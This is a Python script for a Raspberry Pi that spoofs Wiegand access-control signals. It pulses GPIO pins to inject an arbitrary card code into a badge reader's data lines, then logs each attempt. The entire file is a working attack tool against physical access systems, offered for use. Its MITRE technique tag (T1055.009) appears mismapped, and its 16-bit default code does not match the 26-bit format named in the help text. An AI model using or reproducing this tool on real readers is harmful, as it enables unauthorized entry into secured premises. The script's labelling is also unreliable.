#!/usr/bin/env python3

import argparse
import time
import json
import os
from datetime import datetime
import RPi.GPIO as GPIO

LOG_FILE = "results/wiegand_spoof_log.json"
MITRE_TTP = "T1055.009"

DATA0 = 17
DATA1 = 27

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def send_bit(pin):
    GPIO.output(pin, GPIO.LOW)
    time.sleep(0.00005)
    GPIO.output(pin, GPIO.HIGH)
    time.sleep(0.00005)

def spoof_wiegand(code="1000000011000001"):
    GPIO.setmode(GPIO.BCM)
    GPIO.setup(DATA0, GPIO.OUT, initial=GPIO.HIGH)
    GPIO.setup(DATA1, GPIO.OUT, initial=GPIO.HIGH)

    for bit in code:
        if bit == '0':
            send_bit(DATA0)
        else:
            send_bit(DATA1)
    GPIO.cleanup()

def main():
    parser = argparse.ArgumentParser(description="Wiegand Access Spoofer")
    parser.add_argument("--code", default="1000000011000001", help="Binary Wiegand code (26-bit, etc.)")
    args = parser.parse_args()

    spoof_wiegand(args.code)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "spoofed_code": args.code,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
